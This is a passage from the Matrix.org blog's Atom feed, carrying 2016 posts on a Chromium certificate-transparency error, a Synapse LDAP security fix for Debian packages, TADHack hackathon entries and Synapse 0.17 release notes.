 	&lt;li&gt;The full security assessment: &lt;a href=&quot;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;our-research&#x2F;matrix-olm-cryptographic-review&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;our-research&#x2F;matrix-olm-cryptographic-review&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;NCC Group: &lt;a href=&quot;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.nccgroup.trust&#x2F;us&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;Open Technology Fund: &lt;a href=&quot;https:&#x2F;&#x2F;www.opentech.fund&#x2F;&quot;&gt;https:&#x2F;&#x2F;www.opentech.fund&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
 	&lt;li&gt;If you&#x27;re from the press and you&#x27;ve read this far... congratulations, but you probably wanted &lt;a href=&quot;https:&#x2F;&#x2F;pr.blonde20.com&#x2F;matrix-e2e&#x2F;&quot;&gt;this instead&lt;&#x2F;a&gt; :D&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>SSL Issues With Chromium</title>
        <published>2016-11-14T00:00:00+00:00</published>
        <updated>2016-11-14T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/11/14/ssl-issues-with-chromium/" type="text/html"/>
        <id>https://matrix.org/blog/2016/11/14/ssl-issues-with-chromium/</id>
        
        <content type="html">&lt;p&gt;It&#x27;s been brought to our attention that some users are unable to connect to matrix.org and riot.im due to an SSL error, failing with, &amp;quot;NET::ERR_CERTIFICATE_TRANSPARENCY_REQUIRED&amp;quot;. The cause of this is the Chromium bug detailed at &lt;a href=&quot;https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;chromium&#x2F;issues&#x2F;detail?id=664177&quot;&gt;https:&#x2F;&#x2F;bugs.chromium.org&#x2F;p&#x2F;chromium&#x2F;issues&#x2F;detail?id=664177&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;In short, older versions of Chrome &#x2F; Chromium (including Chromium v0.53 which is the default in ubuntu) will refuse to make SSL connections to matrix.org or riot.im because they are unable to verify that the certificates are in the certificate transparency log. This is because the build of Chromium is over 10 weeks old which means it now considers its certificate transparency log to be stale.&lt;&#x2F;p&gt;
&lt;p&gt;This issue is affecting all sites using certificates signed by Symantec and its subsidiaries (which includes amazon.com).&lt;&#x2F;p&gt;
&lt;p&gt;There&#x27;s little we can do about this, short of completely changing our SSL certificate provider, but for users it should be fairly easy to work around by updating to a newer version of Chromium (which may be as simple as restarting the browser).&lt;&#x2F;p&gt;
&lt;p&gt;Update: see also &lt;a href=&quot;https:&#x2F;&#x2F;sslmate.com&#x2F;blog&#x2F;post&#x2F;ct_redaction_in_chrome_53&quot;&gt;https:&#x2F;&#x2F;sslmate.com&#x2F;blog&#x2F;post&#x2F;ct_redaction_in_chrome_53&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=12953172&quot;&gt;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=12953172&lt;&#x2F;a&gt; (top of HN right now)&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse Debian Package Security Announcement - and Synapse 0.18.3</title>
        <published>2016-11-08T00:00:00+00:00</published>
        <updated>2016-11-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/11/08/synapse-debian-package-security-announcement/" type="text/html"/>
        <id>https://matrix.org/blog/2016/11/08/synapse-debian-package-security-announcement/</id>
        
        <content type="html">&lt;p&gt;We were advised of a bug with the LDAP integration an hour ago that allowed unauthenticated login in certain circumstances when using an old version of the ldap3 python module (v0.9.x).&lt;&#x2F;p&gt;
&lt;p&gt;Currently, this is only known to affect the debian packages of synapse. &lt;strong&gt;A fix has been pushed, v0.18.2-2, and it is strongly advised for you to update as soon as possible&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Synapse installed using pip should not be affected, as pip will have bundled a newer version of the ldap3 module.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;update-synapse-v0-18-3-released&quot;&gt;UPDATE: Synapse v0.18.3 released.&lt;&#x2F;h3&gt;
&lt;p&gt;This issue only affects OS (not virtualenv) installations using v0.9.x of the ldap3 python package (e.g. Debian Stable (Jessie)).  Synapse itself specifies a dependency on &amp;gt;v1.0 of ldap3, but as the dependency is optional there is a risk that a stale operating system dependency will be pulled in instead.  To be safe, &lt;strong&gt;0.18.3 of Synapse&lt;&#x2F;strong&gt; has just been released to fix the underlying problem for anyone using the older ldap3 package, regardless of their OS. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.18.3&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.18.3&lt;&#x2F;a&gt; has the details.&lt;&#x2F;p&gt;
&lt;p&gt;Many thanks to Adrián Pérez for reporting the problem, and to hexa- for assistance in quickly solving it!&lt;&#x2F;p&gt;
&lt;p&gt;Signed announcement: &lt;a href=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;11&#x2F;synapse-debian-security-announcement-1.asc&quot;&gt;synapse-debian-security-announcement&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>TADHack Global 2016</title>
        <published>2016-10-20T00:00:00+00:00</published>
        <updated>2016-10-20T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/10/20/tadhack-global-2016/" type="text/html"/>
        <id>https://matrix.org/blog/2016/10/20/tadhack-global-2016/</id>
        
        <content type="html">&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;10&#x2F;TADHack-2016-Global-3-300x244.png&quot; alt=&quot;tadhack-2016-global-3-300x244&quot; width=&quot;300&quot; height=&quot;244&quot; class=&quot;alignleft size-full wp-image-1796&quot; &#x2F;&gt;
TADHack Global 2016 was held across 30+ different locations last weekend. The goal in the TADHack is to create a hack over the weekend, using one or more of the APIs provided by the sponsors - of which Matrix is one. 
&lt;p&gt;Over 2600 people participated, and over 150 hacks were created! I think it&#x27;s safe to say that TADHack Global 2016 was a great success!&lt;&#x2F;p&gt;
&lt;p&gt;The Matrix team were on location in Shoreditch, London, where we helped people with their hacks (while also keeping an eye on the online &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#tadhack-tadmentor-matrix:matrix.org&quot;&gt;TADHack Matrix room&lt;&#x2F;a&gt; to help remote entries). &lt;&#x2F;p&gt;
&lt;p&gt;Several teams used Matrix in their hack, both in London and elsewhere:&lt;&#x2F;p&gt;
&lt;p&gt;In Lisbon, Luis Tonicha and Tiago Dias created &amp;quot;Athos&amp;quot;: a bot for shopping assistance. The bot accepts various queries which it tries to answer using Carrefour&#x27;s API. The team also created a Telestax bridge, so you can send the queries via SMS! This hack won the Lisbon location prize! Watch their &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=sskei22iquQ&amp;t=7m20s&quot;&gt;presentation here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;A team in Moscow did a hack using Matrix, where they created a kind of MUD in Matrix. Unfortunately, the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=i0Y7VmeWX5c&amp;t=3h40m20s&quot;&gt;presentation&lt;&#x2F;a&gt; is not currently available.&lt;&#x2F;p&gt;
&lt;p&gt;Yelly was a remote entry by Fikri Fırat, Utku Yavuz, and Barış Erbil. It is a voice message based chat application inspired by the nature of shouting as a way of communication. See their &lt;a href=&quot;https:&#x2F;&#x2F;youtu.be&#x2F;Q7ePIZ3Y5hg&quot;&gt;presentation here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;In Kiev, Ukraine, the DataArt team (Artem Malykhin, Pavlina Bevz, Igor Maximenko, and Eugene Grachev) created a hack called &amp;quot;Web conference for Smart TV&amp;quot;: an app for Smart TVs for VoIP conferencing. See the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=EK1DwvRvdd4&amp;t=13m50s&quot;&gt;presentation here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Over in Chicago, Sergio Gil, Caterina Lazaro, and Anup Mohan created &amp;quot;Little Endian Kitchen&amp;quot;: Shopping management for your kitchen. The idea was to have a webcam in your fridge that can check which items are &amp;quot;missing&amp;quot; (e.g. which ones need replacing) and even provide a VoIP stream so you can check yourself (even using VR-goggles!) - see the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=CiIiO6vs_So&amp;t=32m46s&quot;&gt;presentation here&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;In Berlin, there were quite a few hacks. One of these was called &amp;quot;Clipboard Monkey&amp;quot; and was made by Tim Unkrig, Tammo Behrends, Markus Kerschkewicz. This team created a decentralized, universal and fully encrypted clipboard using Matrix. See the full &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=nrconLsom00&amp;t=20m20s&quot;&gt;presentation here&lt;&#x2F;a&gt;. We awarded this hack one of the two global prizes of a MacBook Air! They were also joint winners of the Berlin location prize - well done!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, in London we had several teams working on Matrix hacks. There was the &amp;quot;Moodlight&amp;quot; hack by Astrid de Gasté, Ryan Lintott, Tomas Zezula, Istvan Hoffer, and Jing Chan. The team created a sentiment analysis bot connecting Riot (now Element)&#x2F;Matrix to Philips Hue, and analysing the comments in a room using a &lt;a href=&quot;https:&#x2F;&#x2F;algorithmia.com&#x2F;algorithms&#x2F;nlp&#x2F;SocialSentimentAnalysis&quot;&gt;Social Sentiment Analysis&lt;&#x2F;a&gt; library - blue light for positive comments and red for less positive chat. Watch the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=X41RbOKTrbE&amp;t=29m&quot;&gt;presentation here&lt;&#x2F;a&gt;. This hack won the London Location Prize!&lt;&#x2F;p&gt;
&lt;img src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2016&#x2F;10&#x2F;Cu5BNyoXEAAmexk-300x225.jpg&quot; alt=&quot;cu5bnyoxeaamexk&quot; width=&quot;300&quot; height=&quot;225&quot; class=&quot;alignleft size-medium wp-image-1794&quot; &#x2F;&gt;
&lt;p&gt;Also in London, there was Immanuel Baskaran&#x27;s &amp;quot;Hangouts Bridge&amp;quot; hack, which bridged Matrix to Google Hangouts! &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=X41RbOKTrbE&amp;t=17m31s&quot;&gt;Presentation here&lt;&#x2F;a&gt;. In classic &amp;quot;dangerous demo&amp;quot; fashion, Google Hangouts experienced an outage just when the demo was happening. We awarded this hack the Special Matrix Prize - congrats Immanuel!&lt;&#x2F;p&gt;
&lt;p&gt;&amp;quot;Matrix of Things&amp;quot; by Matt Williams, and Yin Yee Kan won the other Matrix global prize, which was a MacBook Air. They created a minimal Matrix client on a ESPB266 micro controller, and added a proximity sensor feature to Riot (now Element) so that two different devices can notice when they are in close proximity. See the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=X41RbOKTrbE&amp;t=11m30s&quot;&gt;presentation and demo here&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
&lt;p&gt;Congrats to all the participants - we hope you had a lot of fun! The &lt;a href=&quot;http:&#x2F;&#x2F;blog.tadhack.com&#x2F;2016&#x2F;10&#x2F;16&#x2F;tadhack-2016-winners&#x2F;&quot;&gt;full list of winners&lt;&#x2F;a&gt; is available over on the TADHack blog.&lt;&#x2F;p&gt;
&lt;p&gt;And if the hackathon has inspired you to hack on Matrix, please come chat to us in &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#matrix-dev:matrix.org&quot;&gt;#matrix-dev&lt;&#x2F;a&gt; or the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.to&#x2F;#&#x2F;#tadhack-tadmentor-matrix:matrix.org&quot;&gt;TADHack Matrix room&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse v0.17.2 released!</title>
        <published>2016-09-08T00:00:00+00:00</published>
        <updated>2016-09-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/09/08/synapse-v0-17-2-released/" type="text/html"/>
        <id>https://matrix.org/blog/2016/09/08/synapse-v0-17-2-released/</id>
        
        <content type="html">&lt;p&gt;A small update for Synapse has been released: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.17.2&quot;&gt;v0.17.2&lt;&#x2F;a&gt;! It includes a few optimisations to reduce memory usage, as well as some &lt;strong&gt;security bug fixes&lt;&#x2F;strong&gt;. It&#x27;s therefore recommended to upgrade as soon as possible.&lt;&#x2F;p&gt;
&lt;p&gt;The full change log can be found on the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.17.2&quot;&gt;release page&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse v0.17.1 released!</title>
        <published>2016-08-24T00:00:00+00:00</published>
        <updated>2016-08-24T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/08/24/synapse-v0-17-1-released/" type="text/html"/>
        <id>https://matrix.org/blog/2016/08/24/synapse-v0-17-1-released/</id>
        
        <content type="html">&lt;p&gt;Synapse &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.17.1&quot;&gt;v0.17.1&lt;&#x2F;a&gt; is here! It includes a bunch of bug fixes an performance improvements, as well as a brand new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1028&quot;&gt;notifications API&lt;&#x2F;a&gt; added by Dave.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve also been busy adding more metrics into the code to help spot various performance bottlenecks, which should help in the ongoing performance improvement effort.&lt;&#x2F;p&gt;
&lt;p&gt;This also includes security fixes regarding possible XSS attacks involving the media repository - please upgrade!&lt;&#x2F;p&gt;
&lt;p&gt;The full change log can be found on the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.17.1&quot;&gt;release page&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.17.0 released!</title>
        <published>2016-08-08T00:00:00+00:00</published>
        <updated>2016-08-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2016/08/08/synapse-0-17-0-released/" type="text/html"/>
        <id>https://matrix.org/blog/2016/08/08/synapse-0-17-0-released/</id>
        
        <content type="html">&lt;p&gt;Synapse &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.17.0&quot;&gt;v0.17.0&lt;&#x2F;a&gt; is finally here, which includes a couple of security fixes so &lt;strong&gt;please upgrade&lt;&#x2F;strong&gt;. Other notable new things are:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;A bunch of new admin APIs, including purging locally cached data (which has been long requested to help free up disk space). See the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;tree&#x2F;master&#x2F;docs&#x2F;admin_api&quot;&gt;docs folder&lt;&#x2F;a&gt; for more details.&lt;&#x2F;li&gt;
 	&lt;li&gt;Device management APIs in preparation for end to end encryption.&lt;&#x2F;li&gt;
 	&lt;li&gt;Better support for LDAP authentication, thanks to Martin Weinelt! (This may break existing LDAP configuration, see &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;843&quot;&gt;PR #843&lt;&#x2F;a&gt; for more details.)&lt;&#x2F;li&gt;
 	&lt;li&gt;Lots and lots of bug fixes and various bits of performance work.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
For a full list of everything that has changed see below or the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.17.0&quot;&gt;release page&lt;&#x2F;a&gt;.
&lt;p&gt;I&#x27;d also like to thank Will Hunt, Martin Weinelt and Kent Shikama for their contributions!&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-17-0-2016-08-08&quot;&gt;Changes in synapse v0.17.0 (2016-08-08)&lt;&#x2F;h3&gt;
&lt;p&gt;This release contains significant security bug fixes regarding authenticating
events received over federation. PLEASE UPGRADE.&lt;&#x2F;p&gt;
&lt;p&gt;This release changes the LDAP configuration format in a backwards incompatible
way, see PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;843&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;843&quot; data-id=&quot;158692541&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#843&lt;&#x2F;a&gt; for details.&lt;&#x2F;p&gt;
&lt;p&gt;Changes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Add federation &#x2F;version API (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;990&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;990&quot; data-id=&quot;169636556&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#990&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Make psutil dependency optional (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;992&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;992&quot; data-id=&quot;169888303&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#992&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix URL preview API to exclude HTML comments in description (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;988&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;988&quot; data-id=&quot;169610681&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#988&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix error handling of remote joins (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;991&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;991&quot; data-id=&quot;169653250&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#991&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-17-0-rc4-2016-08-05&quot;&gt;Changes in synapse v0.17.0-rc4 (2016-08-05)&lt;&#x2F;h3&gt;
&lt;p&gt;Changes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Change the way we summarize URLs when previewing (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;973&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;973&quot; data-id=&quot;168942221&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#973&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add new &lt;code&gt;&#x2F;state_ids&#x2F;&lt;&#x2F;code&gt; federation API (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;979&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;979&quot; data-id=&quot;169136186&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#979&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Speed up processing of &lt;code&gt;&#x2F;state&#x2F;&lt;&#x2F;code&gt; response (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;986&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;986&quot; data-id=&quot;169570759&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#986&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix event persistence when event has already been partially persisted (PR &lt;a class=&quot;issue-link js-issue-link&quot; title=&quot;Ensure we only persist an event once at a time&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;975&quot; data-id=&quot;169098276&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#975&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;983&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;983&quot; data-id=&quot;169382701&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#983&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;985&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;985&quot; data-id=&quot;169570281&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#985&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix port script to also copy across backfilled events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;982&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;982&quot; data-id=&quot;169344602&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#982&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-17-0-rc3-2016-08-02&quot;&gt;Changes in synapse v0.17.0-rc3 (2016-08-02)&lt;&#x2F;h3&gt;
&lt;p&gt;Changes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Forbid non-ASes from registering users whose names begin with &#x27;_&#x27; (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;958&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;958&quot; data-id=&quot;167904457&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#958&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Add some basic admin API docs (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;963&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;963&quot; data-id=&quot;168102004&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#963&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Send the correct host header when fetching keys (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;941&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;941&quot; data-id=&quot;166784788&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#941&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix joining a room that has missing auth events (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;964&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;964&quot; data-id=&quot;168120112&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#964&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix various push bugs (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;966&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;966&quot; data-id=&quot;168177154&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#966&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;970&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;970&quot; data-id=&quot;168521716&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#970&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix adding emails on registration (PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;968&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;968&quot; data-id=&quot;168337247&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#968&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-17-0-rc1-2016-07-28&quot;&gt;Changes in synapse v0.17.0-rc1 (2016-07-28)&lt;&#x2F;h3&gt;
&lt;p&gt;This release changes the LDAP configuration format in a backwards incompatible
way, see PR &lt;a class=&quot;issue-link js-issue-link&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;843&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;843&quot; data-id=&quot;158692541&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#843&lt;&#x2F;a&gt; for details.&lt;&#x2F;p&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
